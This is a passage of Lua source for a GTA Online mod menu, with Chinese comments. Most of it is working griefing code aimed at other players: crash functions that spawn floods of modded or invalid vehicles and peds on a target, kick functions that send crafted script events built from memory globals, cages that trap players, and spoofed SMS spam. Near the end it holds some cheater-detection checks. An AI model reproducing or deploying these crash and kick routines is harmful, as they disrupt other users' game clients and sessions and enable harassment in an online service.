    local vehicles = {}
    for i = 1, 50 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x + 1000, pcoords.y + 1000, pcoords.z + 1000,
                math.random(0, 360), true, true, false)
            for a = 1, 20 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then
                    VEHICLE.SET_VEHICLE_EXTRA(veh, j, true)
                end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                wait()
            end
            vehicles[#vehicles + 1] = veh
        end)
    end
    wait(500)
    menu.trigger_commands("explode" .. players.get_name(pid))
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end
function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    notification("正在请求...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        wait(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        notification("已尝试但无法加载,请重试")
    end
end
--火车
function BadNetVehicleCrashV2(pid)
    local hashes = {184361638,642617954,586013744,920453016,3186376089,1030400667,240201337}
    local vehicles = {}
    for i = 1, 50 do
        util.create_thread(function()
            request_model_load(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x + 1000, pcoords.y + 1000, pcoords.z + 1000 , math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_WHEELS_CAN_BREAK(veh, 1)
            VEHICLE.SET_VEHICLE_STEER_FOR_BUILDINGS(veh, 1)
            VEHICLE.SWITCH_TRAIN_TRACK(veh, 1)
            VEHICLE.SET_TRAIN_TRACK_SPAWN_FREQUENCY(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            VEHICLE.SET_RANDOM_TRAINS(veh, 1)
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                wait()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    wait(500)
    menu.trigger_commands("explode" ..  players.get_name(pid))
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end
--无效载具v1
function BadNetVehicleCrash(pid)
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                wait()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    wait(2000)
    menu.trigger_commands("explode" ..  players.get_name(pid))
    gtoast("已完成.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end
--无效模型v2崩溃
function BadOutfitCrash(pid)
    RqModel(0x705E61F2)
    local pc = getEntityCoords(getPlayerPed(pid))
    local ped = PED.CREATE_PED(26, 0x705E61F2, pc.x, pc.y, pc.z -1 , 0, true, false)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 45, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 1, 197, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 2, 76, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 3, 196, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 4, 144, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 5, 99, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 6, 102, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 7, 151, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 8, 189, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 9, 56, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 10, 132, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 11, 393, 0, 0)
    wait(100)
    entities.delete_by_handle(ped)
end
--传送到玩家
function tpplayer(pid)
    local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local spped = PLAYER.PLAYER_PED_ID()
        local ye = ENTITY.GET_ENTITY_COORDS(TTPed, true)
        ENTITY.SET_ENTITY_COORDS(spped, ye.x, ye.y, ye.z, true, false, false)
         wait(10 * math.random())
end
------------------------------------
-------------玩家踢出---------------
------------------------------------
--阻止加入踢
function blockjoinkick(pid)
    menu.trigger_commands("historyblock " .. players.get_name(pid))
    menu.trigger_commands("breakup" .. players.get_name(pid))
end
--智能踢
function autokickv1(pid)
        util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
        util.trigger_script_event(1 << pid, {0x6A16C7F, pid, memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 0x13E + 0x7)})
        util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
        menu.trigger_commands("breakup" .. players.get_name(pid))
end
--智能踢
function autokickv2(pid)
    util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
    util.trigger_script_event(1 << pid, {0x6A16C7F, pid, memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 0x13E + 0x7)})
    util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
end
--静默踢
function silencekick(pid)
    util.trigger_script_event(1 << pid, {421832664, pid, 0, memory.read_int(memory.script_global(1951261 + 829))})
end
--美国国家航空航天局踢
function nasakick(pid)
    util.trigger_script_event(1 << pid, {111242367, pid, -210634234})
end
--自然死亡踢
function freemodekick(pid)
    util.trigger_script_event(1 << pid, {111242367, pid, memory.script_global(2689235 + 1 + (pid * 453) + 318 + 7)})
end
--网络保释踢
function networkkick(pid)
    util.trigger_script_event(1 << pid, {1674887089, players.user(), memory.read_int(memory.script_global(1892703 + 1 + (pid * 599) + 510))})
end
--无效掉落踢
function invalidcollectiblekick(pid)
    util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
end
------------------------------------
-------------玩家笼子---------------
------------------------------------
spawned_objects = {}
function zdlzsz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid))
	local hash = util.joaat("prop_test_elevator")
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x , pos.y, pos.z -1, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x , pos.y, pos.z -1, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y , pos.z -1, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z -1, true, true, false) -- right
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x , pos.y, pos.z -1 , true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x , pos.y, pos.z -1 , true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y , pos.z  -1, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y , pos.z -1 , true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z -1 , true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	wait(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(0,cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(0,cage_object, rot.x,rot.y,rot.z, -1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--笼子
function ptlz(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
    if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
        menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
        wait(300)
        if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
            notification("Failed to kick player out of the vehicle", colors.red)
            menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
            return
        end
        menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
        pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    end
    cage_player(pos)
end
--七度空间
function qdkj(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	local rot  = ENTITY.GET_ENTITY_ROTATION(0,cage_object)
	rot.y = 90
	ENTITY.FREEZE_ENTITY_POSITION(0,cage_object, true)
	ENTITY.FREEZE_ENTITY_POSITION(0,cage_object2, true)
	ENTITY.FREEZE_ENTITY_POSITION(0,cage_object3, true)
	ENTITY.FREEZE_ENTITY_POSITION(0,cage_object4, true)
	ENTITY.FREEZE_ENTITY_POSITION(0,cage_object5, true)
	wait(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--钱笼子
function zdlz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid))
	local hash = util.joaat("bkr_prop_moneypack_03a")
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	wait(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(0,cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(0,cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--垃圾箱
function yylz(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid))
	local hash = 684586828
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
	cages[#cages + 1] = cage_object
	wait(15)
	local rot  = ENTITY.GET_ENTITY_ROTATION(0,cage_object)
	rot.y = 90
	ENTITY.SET_ENTITY_ROTATION(0,cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(0,cage_object)
end
--小车车
function cclz(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid))
    local hash = 4022605402
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do		
        wait()
    end
    local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
    cages[#cages + 1] = cage_object
    wait(15)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐
function sdkl1(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	wait(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐pro
function sdkl2(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	wait(15)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--圣诞快乐promax
function sdkl3(pid)
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		wait()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	wait()
	local rot  = ENTITY.GET_ENTITY_ROTATION(0,cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(0,cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--电击笼
function powercage(pid)
    local number_of_cages = 6
    local elec_box = util.joaat("prop_elecbox_12")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    pos.z -= 0.5
    request_model(elec_box)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(2.5)
        obj_pos:add(pos)
        for offs_z = 1, 5 do
            local electric_cage = entities.create_object(elec_box, obj_pos)
            spawned_objects[#spawned_objects + 1] = electric_cage
            ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
            obj_pos.z += 0.75
            ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
        end
    end
end
--竞技管
function jjglz()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid))
    STREAMING.REQUEST_MODEL(2081936690)
    while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
        wait()
    end
    local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
    cages[#cages + 1] = cage_object
    wait(15)
    local rot  = ENTITY.GET_ENTITY_ROTATION(0,cage_object)
    rot.y = 90
    ENTITY.SET_ENTITY_ROTATION(0,cage_object, rot.x,rot.y,rot.z,1,true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--竞技管2
function jjglzs()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    STREAMING.REQUEST_MODEL(1125864094)
    while not STREAMING.HAS_MODEL_LOADED(1125864094) do		
        wait()
    end
    local cage_object = OBJECT.CREATE_OBJECT(1125864094, pos.x, pos.y, pos.z -4, true, true, false)
    cages[#cages + 1] = cage_object
    wait(15)
    local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
    rot.y = 90
    ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end
--伊丽莎白女王的棺材盒
function gueencage(pid)
    local number_of_cages = 6
    local coffin_hash = util.joaat("prop_coffin_02b")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(coffin_hash)
    local temp_v3 = v3.new(0, 0, 0)
    for i = 1, number_of_cages do
        local angle = (i / number_of_cages) * 360
        temp_v3.z = angle
        local obj_pos = temp_v3:toDir()
        obj_pos:mul(0.8)
        obj_pos:add(pos)
        obj_pos.z += 0.1
       local coffin = entities.create_object(coffin_hash, obj_pos)
       spawned_objects[#spawned_objects + 1] = coffin
       ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
       ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
    end
end
--运输集装箱
function chestcage(pid)
    local container_hash = util.joaat("prop_container_ld_pu")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(container_hash)
    pos.z -= 1
    local container = entities.create_object(container_hash, pos, 0)
    spawned_objects[#spawned_objects + 1] = container
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
--载具笼子
function vehcagelol(pid)
    local container_hash = util.joaat("boxville3")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(container_hash)
    local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
    spawned_objects[#spawned_objects + 1] = container
    ENTITY.SET_ENTITY_VISIBLE(container, false)
    ENTITY.FREEZE_ENTITY_POSITION(container, true)
end
--燃气笼
function gascage(pid)
    local gas_cage_hash = util.joaat("prop_gascage01")
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    request_model(gas_cage_hash)
    pos.z -= 1
    local gas_cage = entities.create_object(gas_cage_hash, pos, 0)
    pos.z += 1
    local gas_cage2 = entities.create_object(gas_cage_hash, pos, 0)
    spawned_objects[#spawned_objects + 1] = gas_cage
    spawned_objects[#spawned_objects + 1] = gas_cage2
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage, true)
    ENTITY.FREEZE_ENTITY_POSITION(gas_cage2, true)
end
------------------------------------
-------------声音恶搞---------------
------------------------------------	
function laughsound(pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local voice = "A_F_M_EASTSA_01_LATINO_FULL_01"
    local speech = "FEMALE_DISTANT_LAUGH"
    local z_off = 0
    if PED.IS_PED_IN_ANY_VEHICLE(target_ped, false) then 
        z_off = get_model_size(ENTITY.GET_ENTITY_MODEL(PED.GET_VEHICLE_PED_IS_IN(target_ped, false))).z
    end
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 0.0, -1.0, 0.0 + z_off)
    request_model_load(util.joaat("s_f_m_shop_high"))
    local voice_ped = entities.create_ped(28, util.joaat("s_f_m_shop_high"), coords, 0)
    ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(voice_ped, true, false)
    ENTITY.SET_ENTITY_VISIBLE(voice_ped, false, 0)
    ENTITY.FREEZE_ENTITY_POSITION(voice_ped, true)
    ENTITY.SET_ENTITY_INVINCIBLE(voice_ped, true)
    AUDIO.PLAY_PED_AMBIENT_SPEECH_WITH_VOICE_NATIVE(voice_ped, speech, voice, "SPEECH_PARAMS_FORCE", 0)
    wait(1500)
    entities.delete_by_handle(voice_ped)
end
function stcnm(pid)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "SPAWN", PLAYER.GET_PLAYER_PED(pid), "BARRY_01_SOUNDSET", true, 2)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "External_Explosion", PLAYER.GET_PLAYER_PED(pid), "Methamphetamine_Job_Sounds", true, 1)
end
function phonesoundcnm(pid)
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Menu_Accept", PLAYER.GET_PLAYER_PED(pid), "Phone_SoundSet_Default", true, 2)
end
function send_player_label_sms(label, pid)
    local event_data = {-791892894, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
    local out = label:sub(1, 127)
    for i = 0, #out -1 do
        local slot = i // 8
        local byte = string.byte(out, i + 1)
        event_data[slot + 3] = event_data[slot + 3] | byte << ( (i - slot * 8) * 8)
    end
    util.trigger_script_event(1 << pid, event_data)
end
function textspoof(pid)
    if index == 1 then
        for i=1, #sexts do
            send_player_label_sms(sexts[i], pid)
        end
    else
        for i=1, 100 do
            send_player_label_sms(all_labels[math.random(1, #all_labels)], pid)
            wait()
        end
    end
    gtoast("完成")
end
------------------------------------
-------------作弊者检测-------------
------------------------------------
local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}
function get_transition_state(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 245)) -- Global_2657589[bVar0 /*466*/].f_245
end
function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 245)) -- Global_2657589[bVar0 /*466*/].f_245
end
local unreleased_vehicles = {
    "Sentinel4",
}
local modded_vehicles = {
    "dune2",
    "tractor",
    "dilettante2",
    "asea2",
    "cutter",
    "mesa2",
    "jet",
    "skylift",
    "policeold1",
    "policeold2",
    "armytrailer2",
    "towtruck",
    "towtruck2",
    "cargoplane",
}
local modded_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
}
--自由镜头无碰撞
function GetSpawnState(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
end
function free_cam()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(pid)
        wait()
        local currentpos = players.get_position(pid)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(pid)
        and GetInteriorPlayerIsIn(pid) == 0 and GetSpawnState(pid) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false) -- too many false positives occured when players where driving. so fuck them. lol.
        and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO2(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(players.get_position(players.user()), players.get_position(pid)) <= 395.0 -- 400 was causing false positives
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            gtoast(players.get_name(pid) .. " 正在悬浮")
            break
        end
    end
end
--玩家无敌检测
function god_detection()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
